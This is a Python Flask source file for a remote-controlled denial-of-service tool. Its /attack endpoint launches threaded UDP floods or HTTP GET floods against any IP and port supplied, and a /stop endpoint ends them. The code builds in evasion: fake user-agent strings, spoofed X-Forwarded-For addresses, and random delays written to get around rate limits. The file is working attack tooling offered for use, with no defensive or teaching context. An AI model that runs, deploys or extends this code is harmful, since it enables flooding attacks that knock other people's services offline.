
from flask import Flask, request
import threading, socket, time, random

app = Flask(__name__)
attack_running = False

# تكتيكات Bypass
FAKE_UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Gecko/20100101 Firefox/91.0",
    "curl/7.68.0", "Wget/1.20.3 (linux-gnu)"
]

def udp_attack(ip, port, duration):
    global attack_running
    end = time.time() + duration
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    while attack_running and time.time() < end:
        try:
            s.sendto(data, (ip, port))
            time.sleep(random.uniform(0.001, 0.005))  # Random delay (bypass rate limit)
        except:
            pass
    s.close()

def http_flood(ip, port, duration):
    import http.client
    global attack_running
    end = time.time() + duration
    while attack_running and time.time() < end:
        try:
            conn = http.client.HTTPConnection(ip, port, timeout=1)
            conn.putrequest("GET", "/")
            conn.putheader("User-Agent", random.choice(FAKE_UA_LIST))
            conn.putheader("X-Forwarded-For", f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
            conn.putheader("Connection", "keep-alive")
            conn.endheaders()
            conn.close()
        except:
            pass

from flask import Flask, request
@app.route('/attack', methods=['POST'])
def attack():
    global attack_running
    data = request.json
    ip = data.get('ip')
    port = int(data.get('port'))
    duration = int(data.get('duration'))
    method = data.get('method', 'udp')

    attack_running = True

    if method == 'udp':
        threading.Thread(target=udp_attack, args=(ip, port, duration)).start()
    elif method == 'http':
        threading.Thread(target=http_flood, args=(ip, port, duration)).start()
    return {'status': f'{method} attack started'}

@app.route('/stop', methods=['POST'])
def stop():
    global attack_running
    attack_running = False
    return {'status': 'attack stopped'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
